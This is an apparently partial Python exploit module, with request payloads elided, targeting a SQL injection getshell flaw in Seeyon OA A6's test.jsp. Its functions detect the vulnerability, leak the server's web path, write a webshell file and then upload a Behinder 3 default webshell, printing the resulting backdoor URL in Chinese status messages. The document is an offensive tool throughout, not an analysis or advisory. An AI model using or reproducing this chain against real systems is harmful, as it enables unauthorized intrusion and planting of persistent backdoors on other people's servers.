...
def POC_1(target_url):
    ...
    try:
        ...
        if '序号' in response.text and "@@basedir" in response.text and response.status_code == 200:
            ...
            print(Vcolors.RED + "[+] 目标 {} 存在致远OA A6 test.jsp SQL注入Getshell漏洞, web绝对路径: {}".format(target_url,OA_dir)+Vcolors.ENDC)
            ...
            print(Vcolors.WARNING + "[x] 不存在致远OA A6 test.jsp SQL注入Getshell漏洞" + Vcolors.ENDC)
    except:
        print(Vcolors.WARNING + "[ERROR] 目标请求失败" + Vcolors.ENDC)
...
def POC_2(target_url, OA_dir, webshell_name):
    ...
    try:
        ...
        if 'already' in response.text and response.status_code == 200:
            print(Vcolors.RED + "[WARNING] 文件写入木马上传失败, 目标已存在相同文件, 请重新运行" + Vcolors.ENDC)
        elif "No Data" in response.text and response.status_code == 200:
            print(Vcolors.RED + "[SUCCESS] 文件写入木马上传成功, 上传绝对路径: {}".format(OA_dir) + Vcolors.ENDC)
            POC_3(target_url, webshell_name)
        else:
            print(Vcolors.RED + "[WARNING]  木马上传失败, 请手动尝试进一步利用" + Vcolors.ENDC)
    except:
        print(Vcolors.WARNING + "[ERROR] 目标请求失败"+ Vcolors.ENDC)
...
def POC_3(target_url, webshell_name):
    ...
    try:
        ...
        if response.status_code == 200:
            print(Vcolors.RED + "[SUCCESS] 冰蝎三默认木马上传成功: {}yyoa/{}".format(target_url, rebe_webshell) + Vcolors.ENDC)
        else:
            print(Vcolors.RED + "[WARNING] 木马上传失败, 可能被拦截, 请手动尝试进一步利用" + Vcolors.ENDC)
    except:
        print(Vcolors.WARNING + "[ERROR] 目标请求失败" + Vcolors.ENDC)



def 致远OA_A6_test_SQL注入Getshell(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    try:
        POC_1(urldata)
    except:
        logging.error("致远OA_A6_test_SQL注入Getshell脚本出现异常")
